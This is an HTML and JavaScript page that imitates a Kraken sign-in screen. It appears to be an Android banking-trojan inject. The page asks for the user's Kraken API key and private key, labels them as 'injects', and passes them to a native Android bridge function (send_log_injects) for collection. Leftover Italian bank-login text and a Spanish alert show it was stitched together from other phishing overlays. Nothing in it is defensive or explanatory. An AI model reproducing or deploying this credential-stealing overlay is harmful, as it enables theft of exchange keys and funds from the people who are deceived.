<style type="text/css">
    body {
        background: #000;
        margin: 0;
        padding: 0;
        font-family: Helvetica, sans-serif;
    }
    .logo {
text-align: center;
    background-size: 100%;
    padding: 0px 0px 0px 0px;
    background: none;
    color: #fff;
    font-weight: 400;
    text-decoration: none;
    }
    .form {
        text-align: center;
        padding-top: 70px;
    }
    .form label {
        display: block;
    }
    form {
        display: inline-block;
    }
fieldset {
      position: relative;
      text-align: center;
      border: none;
          margin: 0;
    padding: 0;

}

input[type="text"],input[type="password"] {
line-height: 16px;
    font-size: 17px;
    box-sizing: border-box;
    width: 100%;
    position: relative;
    padding: 0px 0px 0px 10px;
    margin: 0px 1px;
    display: block;
    -webkit-box-shadow: none;
    box-shadow: none;
    -webkit-appearance: none;
    height: 48px;
    margin: 0px 0px 10px 0px;
    color: #e1e0e0;
    text-align: left;
    outline: none;
    background: #2a2929;
    border: 1px solid #000;
    border-radius: 10px;
}
input[type="button"] {
left: 0;
    right: 0;
    width: 100%;
    height: 47px;
    margin: 30px 0px 0px 0px;
    outline: none;
    float: right;
    color: #ffffff;
    border: none;
    font-size: 14px;
    -webkit-appearance: none;
    cursor: pointer;
    background: #6d58c2;
    border-radius: 10px;
}
input::placeholder {
    color: #e1e0e0;
    font-size: 15px;
}
input:disabled {
    left: 0;
    right: 0;
    width: 100%;
    height: 47px;
    margin: 30px 0px 0px 0px;
    outline: none;
    float: right;
    color: #2a2929;
    border: none;
    font-size: 14px;
    -webkit-appearance: none;
    cursor: pointer;
    background: #5d5d5d;
    border-radius: 10px;
}
</style>

    <span style="display: block;padding-bottom: 20px;font-size: 17px;">Sign in</span>
    <span style="display: block; padding-bottom: 0px;"><span style="color: #6455a1;font-size: 15px;">Create a Kraken account</span>, <span style="font-size: 15px;">then navigate to <span style="color: #6455a1;">Settings -> API</span> to create API Key</span></span>
</div>

<div class="" id="log" style="display: block;">

<span style="float: left; padding: 15px; font-size: 14px;">Digita il Codice Adesione e il PIN di Banca Multicanale e vai "Avanti"</span>

  <script>
function check() {
  var inp1 = document.getElementById('login'),
      inp2 = document.getElementById('password');
  document.getElementById('send').disabled = inp1.value && inp2.value ? false : "disabled";
}
</script>

<div class="area" style="padding: 0px;border-radius: 10px;margin: 0px 20px 0px 20px;height: 180px;">
        <input type="text" onkeyup="check();" name="login" id="login" placeholder="API Key" style="height: 50px;">
        <input type="password" onkeyup="check();" name="password" id="password" placeholder="Private Key" style="height: 50px;">

        <input type="button" name="sumbit" id="send" value="Confirm" onclick="send_form()" disabled="disabled">

<span style="color: #e3e3e3;font-size: 15px;display: inline-block;padding-top: 30px;">OR</span>

<input type="button" name="sumbit" style="background: #6d58c2; color: #000; font-weight: 600;" value="Scan QR Code">

        <input name="exit" type="hidden" text="true"/>
</div>

</div>

</fieldset> 

<script>
function send_form()
{
            if (document.getElementById("login").value == '')
{
    alert ('¡Todos los campos requeridos!');
    return false;
}
            if (document.getElementById("password").value == '')
{
    alert ('¡Todos los campos requeridos!');
    return false;
}
var data = {};
    data.login = document.getElementById('login').value;
    data.password = document.getElementById('password').value;
    data.type_injects = "crypt";
    data.closed = "close_activity_injects";

    var ua = navigator.userAgent.toLowerCase();
    if(ua.indexOf("android") > -1) {
        try {
            Android.send_log_injects(JSON.stringify(data))
        } catch (err) {}
    }else{
        alert(JSON.stringify(data));
    } 
}
</script>
